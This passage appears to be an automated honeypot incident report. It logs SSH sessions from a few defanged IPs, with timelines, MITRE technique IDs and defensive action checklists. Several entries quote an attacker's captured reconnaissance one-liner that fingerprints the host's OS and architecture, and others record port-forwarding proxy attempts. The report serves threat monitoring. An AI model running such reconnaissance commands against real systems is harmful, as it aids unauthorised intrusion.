| **Last Seen** | 2026-09-03 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:19:24` | `cowrie.session.connect` |
| `2026-09-03 17:19:24` | `cowrie.client.version` |
| `2026-09-03 17:19:24` | `cowrie.client.kex` |
| `2026-09-03 17:19:25` | `cowrie.login.success` |
| `2026-09-03 17:19:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:19:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:19:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4389f96c50d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:19 |
| **Last Seen** | 2026-09-03 17:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:19:34` | `cowrie.session.connect` |
| `2026-09-03 17:19:35` | `cowrie.client.version` |
| `2026-09-03 17:19:35` | `cowrie.client.kex` |
| `2026-09-03 17:19:38` | `cowrie.login.success` |
| `2026-09-03 17:19:39` | `cowrie.session.params` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.success` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.command.input` |
| `2026-09-03 17:19:39` | `cowrie.log.closed` |
| `2026-09-03 17:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12763655c97

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:20 |
| **Last Seen** | 2026-09-03 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:20:31` | `cowrie.session.connect` |
| `2026-09-03 17:20:31` | `cowrie.client.version` |
| `2026-09-03 17:20:31` | `cowrie.client.kex` |
| `2026-09-03 17:20:32` | `cowrie.login.success` |
| `2026-09-03 17:20:32` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:20:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:20:33` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0779d5d8481e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:22 |
| **Last Seen** | 2026-09-03 17:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:22:37` | `cowrie.session.connect` |
| `2026-09-03 17:22:37` | `cowrie.client.version` |
| `2026-09-03 17:22:37` | `cowrie.client.kex` |
| `2026-09-03 17:22:38` | `cowrie.login.success` |
| `2026-09-03 17:22:39` | `cowrie.session.params` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.success` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.command.input` |
| `2026-09-03 17:22:39` | `cowrie.log.closed` |
| `2026-09-03 17:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e6b300b855

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:25 |
| **Last Seen** | 2026-09-03 17:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:25:34` | `cowrie.session.connect` |
| `2026-09-03 17:25:35` | `cowrie.client.version` |
| `2026-09-03 17:25:35` | `cowrie.client.kex` |
| `2026-09-03 17:25:38` | `cowrie.login.success` |
| `2026-09-03 17:25:39` | `cowrie.session.params` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.success` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.command.input` |
| `2026-09-03 17:25:39` | `cowrie.log.closed` |
| `2026-09-03 17:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0738ca497564

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:28 |
| **Last Seen** | 2026-09-03 17:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:28:34` | `cowrie.session.connect` |
| `2026-09-03 17:28:35` | `cowrie.client.version` |
| `2026-09-03 17:28:35` | `cowrie.client.kex` |
| `2026-09-03 17:28:38` | `cowrie.login.success` |
| `2026-09-03 17:28:39` | `cowrie.session.params` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.success` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.command.input` |
| `2026-09-03 17:28:39` | `cowrie.log.closed` |
| `2026-09-03 17:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3273ca0ca1e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:29 |
| **Last Seen** | 2026-09-03 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:29:50` | `cowrie.session.connect` |
| `2026-09-03 17:29:50` | `cowrie.client.version` |
| `2026-09-03 17:29:51` | `cowrie.client.kex` |
| `2026-09-03 17:29:52` | `cowrie.login.success` |
| `2026-09-03 17:29:52` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:29:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:29:52` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e805e0e915d4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:29 |
| **Last Seen** | 2026-09-03 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:29:58` | `cowrie.session.connect` |
| `2026-09-03 17:29:58` | `cowrie.client.version` |
| `2026-09-03 17:29:58` | `cowrie.client.kex` |
| `2026-09-03 17:29:59` | `cowrie.login.success` |
| `2026-09-03 17:29:59` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:29:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:29:59` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ebac513d41

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:31 |
| **Last Seen** | 2026-09-03 17:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:31:02` | `cowrie.session.connect` |
| `2026-09-03 17:31:04` | `cowrie.client.version` |
| `2026-09-03 17:31:04` | `cowrie.client.kex` |
| `2026-09-03 17:31:08` | `cowrie.login.success` |
| `2026-09-03 17:31:09` | `cowrie.session.params` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.success` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.command.input` |
| `2026-09-03 17:31:09` | `cowrie.log.closed` |
| `2026-09-03 17:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa91b76c341b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 17:32 |
| **Last Seen** | 2026-09-03 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:32:25` | `cowrie.session.connect` |
| `2026-09-03 17:32:25` | `cowrie.client.version` |
| `2026-09-03 17:32:25` | `cowrie.client.kex` |
| `2026-09-03 17:32:25` | `cowrie.login.success` |
| `2026-09-03 17:32:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:32:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2681f120d266

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:33 |
| **Last Seen** | 2026-09-03 17:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:33:40` | `cowrie.session.connect` |
| `2026-09-03 17:33:40` | `cowrie.client.version` |
| `2026-09-03 17:33:40` | `cowrie.client.kex` |
| `2026-09-03 17:33:41` | `cowrie.login.success` |
| `2026-09-03 17:33:41` | `cowrie.session.params` |
| `2026-09-03 17:33:41` | `cowrie.command.input` |
| `2026-09-03 17:33:41` | `cowrie.command.input` |
| `2026-09-03 17:33:41` | `cowrie.command.input` |
| `2026-09-03 17:33:41` | `cowrie.command.input` |
| `2026-09-03 17:33:42` | `cowrie.command.input` |
| `2026-09-03 17:33:42` | `cowrie.command.success` |
| `2026-09-03 17:33:42` | `cowrie.command.input` |
| `2026-09-03 17:33:42` | `cowrie.command.input` |
| `2026-09-03 17:33:42` | `cowrie.command.input` |
| `2026-09-03 17:33:42` | `cowrie.command.input` |
| `2026-09-03 17:33:42` | `cowrie.log.closed` |
| `2026-09-03 17:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d530146a53e4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:35 |
| **Last Seen** | 2026-09-03 17:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:35:58` | `cowrie.session.connect` |
| `2026-09-03 17:35:59` | `cowrie.client.version` |
| `2026-09-03 17:35:59` | `cowrie.client.kex` |
| `2026-09-03 17:36:02` | `cowrie.login.success` |
| `2026-09-03 17:36:03` | `cowrie.session.params` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.success` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.command.input` |
| `2026-09-03 17:36:03` | `cowrie.log.closed` |
| `2026-09-03 17:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dd1c1e43a35

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:38 |
| **Last Seen** | 2026-09-03 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:38:19` | `cowrie.session.connect` |
| `2026-09-03 17:38:21` | `cowrie.client.version` |
| `2026-09-03 17:38:21` | `cowrie.client.kex` |
| `2026-09-03 17:38:25` | `cowrie.login.success` |
| `2026-09-03 17:38:26` | `cowrie.session.params` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.success` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.command.input` |
| `2026-09-03 17:38:26` | `cowrie.log.closed` |
| `2026-09-03 17:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28891253a4ea

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:39 |
| **Last Seen** | 2026-09-03 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:39:29` | `cowrie.session.connect` |
| `2026-09-03 17:39:29` | `cowrie.client.version` |
| `2026-09-03 17:39:29` | `cowrie.client.kex` |
| `2026-09-03 17:39:30` | `cowrie.login.success` |
| `2026-09-03 17:39:30` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:39:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:39:30` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d17289e161e4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:40 |
| **Last Seen** | 2026-09-03 17:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:40:47` | `cowrie.session.connect` |
| `2026-09-03 17:40:47` | `cowrie.client.version` |
| `2026-09-03 17:40:48` | `cowrie.client.kex` |
| `2026-09-03 17:40:48` | `cowrie.login.success` |
| `2026-09-03 17:40:49` | `cowrie.session.params` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.success` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:49` | `cowrie.command.input` |
| `2026-09-03 17:40:50` | `cowrie.log.closed` |
| `2026-09-03 17:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

